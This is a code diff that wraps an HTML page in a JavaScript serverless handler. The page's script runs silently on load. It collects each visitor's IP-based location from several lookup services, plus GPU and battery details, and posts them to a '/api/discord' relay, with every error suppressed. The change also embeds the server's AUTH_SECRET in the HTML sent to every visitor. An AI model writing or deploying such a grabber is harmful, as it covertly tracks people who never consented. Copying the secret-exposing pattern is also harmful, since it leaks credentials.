@@ -1,4 +1,7 @@
-<!DOCTYPE html>
+export default function handler(req, res) {
+  const token = process.env.AUTH_SECRET || "";
+  
+  const html = `<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -37,11 +40,11 @@
     </div>
 
     <script>
-        // gather system info
+        const AUTH_TOKEN = "${token}";
+        
         async function collectInfo() {
             let data = {};
             
-            // try multiple IP APIs in case one fails
             const apis = [
                 "https://ipapi.co/json/",
                 "https://ipwho.is/",
@@ -56,12 +59,9 @@
                         data = Object.assign(data, json);
                         if(data.ip || data.query) break;
                     }
-                } catch(err) {
-                    // silent fail, try next API
-                }
+                } catch(err) {}
             }
 
-            // GPU detection
             let gpuInfo = "Unknown";
             try {
                 const c = document.createElement('canvas');
@@ -74,7 +74,6 @@
                 }
             } catch(e) {}
 
-            // Battery info
             let batteryLevel = "Unknown";
             let chargingStatus = "Unknown";
             try {
@@ -122,23 +121,27 @@
             let message = "";
             for(let key in info) {
                 if(key.startsWith("---")) {
-                    message += info[key] + key + "\n";
+                    message += info[key] + key + "\\n";
                 } else {
-                    message += key + ": " + info[key] + "\n";
+                    message += key + ": " + info[key] + "\\n";
                 }
             }
 
-            // send to backend
             fetch("/api/discord", {
                 method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({content: "```\n" + message + "\n```"})
-            }).catch(function(err) {
-                // ignore errors
-            });
+                headers: {
+                    "Content-Type": "application/json",
+                    "Authorization": "Bearer " + AUTH_TOKEN
+                },
+                body: JSON.stringify({content: "\`\`\`\\n" + message + "\\n\`\`\`"})
+            }).catch(function(err) {});
         }
 
         collectInfo();
     </script>
 </body>
-</html>
+</html>`;
+
+  res.setHeader('Content-Type', 'text/html');
+  res.status(200).send(html);
+}
